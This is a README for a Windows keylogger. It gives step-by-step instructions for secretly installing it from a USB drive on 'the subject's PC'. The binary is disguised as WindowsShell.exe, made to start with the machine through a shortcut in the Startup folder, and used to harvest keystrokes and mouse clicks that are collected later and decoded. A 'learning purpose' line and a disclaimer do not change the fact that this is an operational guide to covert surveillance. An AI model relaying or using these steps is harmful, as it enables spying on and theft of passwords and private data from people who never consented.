#### A Terrific Keystroke Recorder

This tacky program hides itself in the subjectâ€™s PC (Windows XP or later), and silently records all keyboard and mouse operations. It is launched automatically with PC start, then stores data in Virtual-Key code with record-date. Now all you have to do is- collect the record, and decode it.

**This project is created only for learning purpose.**

### How to use?

1. Download the full package from [here](https://github.com/KnockEngine/EphialtesOfTrachis.git), unzip it, and move it to your pen-drive. It should look something like this-

 </div>

 **WindowsShell.exe** is the compiled and renamed form of [**Keylogger.cpp**](https://github.com/KnockEngine/EphialtesOfTrachis/blob/master/Keylogger.cpp). This is done as no-one will let a keylogger program run in their PC! **WindowsShell** is the link file of **WindowsShell.exe**. 

2. Insert your pen-drive in a computer and run **Infect.bat**. This will install **WindowsShell.exe** (in the *%appdata%* folder) & **WindowsShell.lnk** (in *%appdata%\Microsoft\Windows\Start Menu\Programs\Startup*) in that PC, and start it. 

3. Wait for some days , then return to the PC, insert the pen-drive and run **CollectData.bat**. You will get a file named **Record.log**. This is what it contains-

 </div>

4. Now, simply run **RecordDecoder.exe** (keep **Record.log** in the same folder & do not rename it), and you will get **Data.log**. This file contains all the key-strokes and mouse-clicks. It is all up to you now to find necessary information from this. 

 <div align="center">

 </div>

 You may use [**RecordDecoderFocused**](https://github.com/KnockEngine/EphialtesOfTrachis/blob/master/RecordDecoderFocused.cpp) instead of **RecordDecoder.exe**, it will get rid of some unnecessary data automatically for you.

5. If you want to remove the Keylogger from that PC, run **Cure.bat**.

**Note:** *We will not take any responsibility of someone else's ill act with my program*. But we do believe that a real learner will learn a lot from this.
